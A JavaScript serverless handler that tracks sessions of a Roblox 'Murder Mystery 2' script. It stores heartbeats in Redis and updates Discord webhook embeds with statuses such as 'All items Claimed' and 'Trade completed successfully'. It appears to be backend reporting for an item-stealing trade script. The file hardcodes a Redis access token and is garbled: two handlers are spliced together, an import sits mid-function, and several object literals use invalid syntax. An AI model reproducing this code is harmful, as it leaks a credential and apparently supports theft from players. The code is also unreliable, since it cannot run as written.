export default async function handler(req, res) {
    // Force allow POST
    if (req.method !== 'POST' && req.method !== 'GET') {
        return res.status(405).json({ error: 'Use POST for updates' });
    }

    const body = req.body || {};
    // Log this in Vercel Dashboard to see if Roblox is actually reaching it
    console.log("Incoming request:", { action: body.action, msgId: body.msgId });

import { Redis } from '@upstash/redis'

const redis = new Redis({
  url: "https://sincere-pika-37791.upstash.io",
  token: "AZOfAAIncDFhMGViOTE2MTRiYjg0ZjRmOWRmNTg4ODViNTNiNDAwMXAxMzc3OTE",
})

export default async function handler(req, res) {
    // Standardize body for Cron-job.org or Roblox requests
    const body = req.body || {};
    const { msgId, webhookUrl, action } = body;

    // 1. WATCHDOG: This runs EVERY time the URL is hit (by Cron or Roblox)
    try {
        const keys = await redis.keys('hb_*');
        for (const key of keys) {
            const data = await redis.get(key);
            
            // Check if player hasn't pinged in over 70 seconds
            if (data && (Date.now() - data.lastSeen > 70000)) {
                await fetch(`${data.webhookUrl}/messages/${data.msgId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "Wym's Scripts • Murder Mystery 2",
                            description: "## Status:\n```lua\n🔴 Left (Player Left Or Crashed)```",
                            color: 16711680, // Red
                            footer: { text = "Auto-detected departure via Cron" }
                        }]
                    })
                }).catch(() => {});
                
                await redis.del(key);
            }
        }
    } catch (err) {
        console.error("Watchdog error:", err);
    }

    // 2. LIVE UPDATES: Handle specific actions from the Roblox Script
    if (msgId && webhookUrl) {
        let embedUpdate = null;

        if (action === "partial") {
            embedUpdate = {
                title: "Wym's Scripts • Murder Mystery 2",
                description: "## Status:\n```lua\n🟡 Partial (Not All items taken)```",
                color: 16776960, // Yellow
                footer: { text = "Partial Progress" }
            };
        } else if (action === "stop") {
            embedUpdate = {
                title: "Wym's Scripts • Murder Mystery 2",
                description: "## Status:\n```lua\n🟢 Success (All items Claimed)```",
                color: 65280, // Green
                footer: { text = "Trade completed successfully!" }
            };
            // Delete from Redis immediately so Cron doesn't turn it Red
            await redis.del(`hb_${msgId}`);
        }

        if (embedUpdate) {
            await fetch(`${webhookUrl}/messages/${msgId}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embedUpdate] })
            }).catch(() => {});
        }
    }

    // 3. HEARTBEAT: Keep session alive
    if (action === "ping" && msgId && webhookUrl) {
        await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
    } 

    return res.status(200).json({ ok: true, watchdog_active: true });
}
